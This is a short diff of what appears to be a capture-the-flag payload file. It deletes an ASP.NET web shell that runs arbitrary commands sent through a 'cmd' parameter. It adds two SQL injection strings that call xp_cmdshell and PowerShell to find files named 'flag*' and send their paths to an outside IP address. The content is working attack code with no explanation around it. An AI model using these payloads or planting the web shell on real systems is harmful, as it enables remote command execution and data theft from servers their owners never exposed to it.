@@ -1,17 +1,2 @@
-<%@ Page Language="C#" Debug="true" %>
-<%@ Import Namespace="System.Diagnostics" %>
-<%
-    string cmd = Request["cmd"];
-    if (cmd != null)
-    {
-        Process proc = new Process();
-        proc.StartInfo.FileName = "cmd.exe";
-        proc.StartInfo.Arguments = "/c " + cmd;
-        proc.StartInfo.UseShellExecute = false;
-        proc.StartInfo.RedirectStandardOutput = true;
-        proc.StartInfo.CreateNoWindow = true;
-        proc.Start();
-        string output = proc.StandardOutput.ReadToEnd();
-        Response.Write("<pre>" + output + "</pre>");
-    }
-%>
+'; EXEC xp_cmdshell 'powershell -Command "$a = Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -like ''flag*''} | Select -First 1 -ExpandProperty FullName; Invoke-WebRequest http://1.2.3.4/?$a"';--
+'; EXEC xp_cmdshell 'powershell -Command "$a = Get-ChildItem -Path C:\Users -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -like ''flag*''} | Select -First 1 -ExpandProperty FullName; Invoke-WebRequest http://1.2.3.4/?$a"';--
